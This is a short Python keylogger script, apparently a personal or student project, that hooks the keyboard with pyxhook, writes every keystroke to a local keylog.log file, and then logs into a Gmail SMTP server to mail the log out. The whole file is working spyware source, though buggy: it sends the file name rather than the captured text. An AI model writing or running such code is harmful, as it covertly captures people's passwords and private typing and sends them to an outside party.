#Nick Perri 
# import os and pyxhook 
# run pip install pyxhook 
import os
import pyxhook 
import email, ssl, smtplib, time  

port = 465 
password = "test"

context = ssl.create_default_context() 


# main 
def main():
    # specifies the name/location of the file where the output will be saved
    log_file = f'{os.getcwd()}/{"keylog"}.log' 

    # the logging function that is based on key presses 
    def KeyP(e):
        # open the file with append 
        with open(log_file, "a") as f: 
            # If enter key is pressed 
            if e.Ascii == 13:
                # Write to the file the enter key was pressed and then go to a new line
                f.write('Enter\n')
            # If spacepar is pressed 
            if e.Ascii == 32:
                f.write(' [spacebar] ')
            else:
                # write to the file every character and convert input to readable ascii
                f.write(e.Key)

    # create HookManager 
    new_hook = pyxhook.HookManager()
    #listen to all key presses 
    new_hook.KeyDown = KeyP

    # hook the keyboard 
    new_hook.HookKeyboard()

    #start session
    new_hook.start()
    
    #set up email 
    email = "testemail@gmail.com" 
    
    with open(log_file, 'r') as file: 
        data = file.read().replace('\n', '') 
        
    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server: 
        server.login("my@gmail.com", password) 
        time.sleep(60)
        server.sendmail("my@gmail.com", "my@gmail.com", log_file)


if __name__ == "__main__":
    main()
